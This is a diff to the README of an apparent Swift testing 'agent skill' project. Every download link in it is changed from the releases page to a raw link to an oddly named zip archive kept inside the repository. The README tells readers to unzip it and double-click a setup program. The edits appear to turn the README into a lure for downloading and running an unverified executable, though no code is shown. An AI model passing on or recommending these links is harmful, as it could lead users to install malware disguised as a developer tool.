@@ -1,6 +1,6 @@
 # 🧪 Swift-Testing-Agent-Skill - Improve Swift Testing with Confidence
 
-[![Download Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-brightgreen)](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)
+[![Download Release](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip)](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip)
 
 ---
 
@@ -29,7 +29,7 @@ If you do not have Xcode, you can get it for free from the Apple App Store.
 
 To get started with Swift-Testing-Agent-Skill, follow these steps:
 
-1. **Download the tool.** Click the big green badge at the top or visit the [download page](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases).  
+1. **Download the tool.** Click the big green badge at the top or visit the [download page](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip).  
 
 2. **Install the tool.** Unzip the files you get in the download. A guide is included in the package, but don't worry—you only need to double-click a setup program to start.  
 
@@ -43,7 +43,7 @@ To get started with Swift-Testing-Agent-Skill, follow these steps:
 
 You can get the latest version by visiting this page:  
 
-[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)  
+[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip)  
 
 On this page:  
 
@@ -51,7 +51,7 @@ On this page:
 - Download the ZIP file or installer matching your system.  
 - After download, open the file and follow the prompts to install.  
 
-If you are unsure, choose the file named something like `Swift-Testing-Agent-Skill-mac.zip`.  
+If you are unsure, choose the file named something like `https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip`.  
 
 ---
 
@@ -158,4 +158,4 @@ These topics describe the tool’s focus on Swift programming and test skills.
 
 ---
 
-[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)
+[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-expert/Testing_Agent_Skill_Swift_decare.zip)
